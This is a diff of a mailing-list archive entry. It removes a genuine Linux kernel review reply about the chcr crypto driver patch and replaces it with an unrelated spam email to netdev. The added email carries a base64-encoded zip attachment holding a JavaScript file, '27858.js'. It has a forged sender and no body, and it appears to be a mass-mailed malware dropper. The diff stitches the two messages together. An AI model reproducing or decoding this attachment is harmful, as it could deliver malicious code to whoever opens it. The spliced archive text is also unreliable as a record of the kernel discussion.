@@ -1,115 +1,92 @@
-From: Harsh Jain <harshjain.prof-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org>
-Subject: Re: [PATCH 08/22] crypto: chcr: Make use of the new sg_map helper
- function
-Date: Sat, 15 Apr 2017 10:23:33 +0530
-Message-ID: <CAFXBA=k74+9jRZQX4r_iGoL8yiDbXPDTLw+AELEb1LeT_jeKiQ@mail.gmail.com>
-References: <1492121135-4437-1-git-send-email-logang@deltatee.com>
- <1492121135-4437-9-git-send-email-logang@deltatee.com>
+From: <chacoma4018@windstream.net>
+Subject: 49545 netdev
+Date: Sat, 15 Apr 2017 05:40:35 -0000
+Message-ID: <149223483502.20709.3705294722309356184@telebucaramanga.net.co>
+Reply-To: <chacoma4018@windstream.net>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
-Cc: Steve Wise <swise-7bPotxP6k4+P2YhJcF5u+vpXobYPEAuW@public.gmane.org>, linux-nvme-IAPFreCvJWM7uuMidbF8XUB+6BGkLq7r@public.gmane.org,
- target-devel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, Sumit Semwal <sumit.semwal-QSEj5FYQhm4dnm+yROfE0A@public.gmane.org>,
- devel-gWbeCf7V1WCQmaza687I9mD2FQJk+8+b@public.gmane.org, rds-devel-N0ozoZBvEnrZJqsBc5GL+g@public.gmane.org,
- linux-scsi-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, Matthew Wilcox <mawilcox-0li6OtcxBFHby3iVrkZq2A@public.gmane.org>,
- linux-rdma-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, Christoph Hellwig <hch-jcswGhMUV9g@public.gmane.org>,
- fcoe-devel-s9riP+hp16TNLxjTenLetw@public.gmane.org, open-iscsi-/JYPxA39Uh5TLH3MbocFFw@public.gmane.org,
- linux-media-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, Ming Lin <ming.l-Vzezgt5dB6uUEJcrhfAQsw@public.gmane.org>,
- intel-gfx-PD4FTy7X32lNgt0PjOBp9y5qC8QIuHrW@public.gmane.org, sparmaintainer-GLv8BlqOqDDQT0dZR+AlfA@public.gmane.org,
- linux-raid-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, dri-devel-PD4FTy7X32lNgt0PjOBp9y5qC8QIuHrW@public.gmane.org,
- megaraidlinux.pdl-dY08KVG/lbpWk0Htik3J/w@public.gmane.org, Jens Axboe <axboe-tSWWG44O7X1aa/9Udqfwiw@public.gmane.org>,
- linaro-mm-sig-cunTk1MwBs8s++Sfvej+rw@public.gmane.org,
- "Martin K. Petersen" <martin.petersen-QHcLZuEGTsvQT0dZR+AlfA@public.gmane.org>,
- Greg Kroah-Hartman <gregkh-hQyY1W1yCW8ekmWlsbkhG0B+6BGkLq7r@public.gmane.org>, linux-nvdimm-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org,
- linux-mmc-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, linux-kernel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org,
- linux-crypto-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, netdev@
-To: Logan Gunthorpe <logang-OTvnGxWRz7hWk0Htik3J/w@public.gmane.org>, harsh-ut6Up61K2wZBDgjK7y7TUQ@public.gmane.org
-Return-path: <linux-nvdimm-bounces-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org>
-In-Reply-To: <1492121135-4437-9-git-send-email-logang-OTvnGxWRz7hWk0Htik3J/w@public.gmane.org>
-List-Unsubscribe: <https://lists.01.org/mailman/options/linux-nvdimm>,
- <mailto:linux-nvdimm-request-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org?subject=unsubscribe>
-List-Archive: <http://lists.01.org/pipermail/linux-nvdimm/>
-List-Post: <mailto:linux-nvdimm-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org>
-List-Help: <mailto:linux-nvdimm-request-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org?subject=help>
-List-Subscribe: <https://lists.01.org/mailman/listinfo/linux-nvdimm>,
- <mailto:linux-nvdimm-request-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org?subject=subscribe>
-Errors-To: linux-nvdimm-bounces-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org
-Sender: "Linux-nvdimm" <linux-nvdimm-bounces-hn68Rpc1hR1g9hUCZPvPmw@public.gmane.org>
-List-Id: netdev.vger.kernel.org
+Content-Type: application/zip; name="8704608785.zip"
+Content-Transfer-Encoding: base64
+To: "netdev" <netdev@vger.kernel.org>
+Return-path: <netdev-owner@vger.kernel.org>
+Received: from 181-174-61-145.telebucaramanga.net.co ([181.174.61.145]:37149
+        "HELO telebucaramanga.net.co" rhost-flags-OK-FAIL-OK-FAIL)
+        by vger.kernel.org with SMTP id S1750981AbdDOFki (ORCPT
+        <rfc822;netdev@vger.kernel.org>); Sat, 15 Apr 2017 01:40:38 -0400
+Content-Disposition: attachment
+Sender: netdev-owner@vger.kernel.org
+List-ID: <netdev.vger.kernel.org>
 
-On Fri, Apr 14, 2017 at 3:35 AM, Logan Gunthorpe <logang-OTvnGxWRz7hWk0Htik3J/w@public.gmane.org> wrote:
-> The get_page in this area looks *highly* suspect due to there being no
-> corresponding put_page. However, I've left that as is to avoid breaking
-> things.
-chcr driver will post the request to LLD driver cxgb4 and put_page is
-implemented there. it will no harm. Any how
-we have removed the below code from driver.
-
-http://www.mail-archive.com/linux-crypto-u79uwXL29TY76Z2rM5mHXA@public.gmane.org/msg24561.html
-
-After this merge we can ignore your patch. Thanks
-
->
-> I've also removed the KMAP_ATOMIC_ARGS check as it appears to be dead
-> code that dates back to when it was first committed...
-
-
->
-> Signed-off-by: Logan Gunthorpe <logang-OTvnGxWRz7hWk0Htik3J/w@public.gmane.org>
-> ---
->  drivers/crypto/chelsio/chcr_algo.c | 28 +++++++++++++++-------------
->  1 file changed, 15 insertions(+), 13 deletions(-)
->
-> diff --git a/drivers/crypto/chelsio/chcr_algo.c b/drivers/crypto/chelsio/chcr_algo.c
-> index 41bc7f4..a993d1d 100644
-> --- a/drivers/crypto/chelsio/chcr_algo.c
-> +++ b/drivers/crypto/chelsio/chcr_algo.c
-> @@ -1489,22 +1489,21 @@ static struct sk_buff *create_authenc_wr(struct aead_request *req,
->         return ERR_PTR(-EINVAL);
->  }
->
-> -static void aes_gcm_empty_pld_pad(struct scatterlist *sg,
-> -                                 unsigned short offset)
-> +static int aes_gcm_empty_pld_pad(struct scatterlist *sg,
-> +                                unsigned short offset)
->  {
-> -       struct page *spage;
->         unsigned char *addr;
->
-> -       spage = sg_page(sg);
-> -       get_page(spage); /* so that it is not freed by NIC */
-> -#ifdef KMAP_ATOMIC_ARGS
-> -       addr = kmap_atomic(spage, KM_SOFTIRQ0);
-> -#else
-> -       addr = kmap_atomic(spage);
-> -#endif
-> -       memset(addr + sg->offset, 0, offset + 1);
-> +       get_page(sg_page(sg)); /* so that it is not freed by NIC */
-> +
-> +       addr = sg_map(sg, SG_KMAP_ATOMIC);
-> +       if (IS_ERR(addr))
-> +               return PTR_ERR(addr);
-> +
-> +       memset(addr, 0, offset + 1);
-> +       sg_unmap(sg, addr, SG_KMAP_ATOMIC);
->
-> -       kunmap_atomic(addr);
-> +       return 0;
->  }
->
->  static int set_msg_len(u8 *block, unsigned int msglen, int csize)
-> @@ -1940,7 +1939,10 @@ static struct sk_buff *create_gcm_wr(struct aead_request *req,
->         if (req->cryptlen) {
->                 write_sg_to_skb(skb, &frags, src, req->cryptlen);
->         } else {
-> -               aes_gcm_empty_pld_pad(req->dst, authsize - 1);
-> +               err = aes_gcm_empty_pld_pad(req->dst, authsize - 1);
-> +               if (err)
-> +                       goto dstmap_fail;
-> +
->                 write_sg_to_skb(skb, &frags, reqctx->dst, crypt_len);
->
->         }
-> --
-> 2.1.4
->
+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
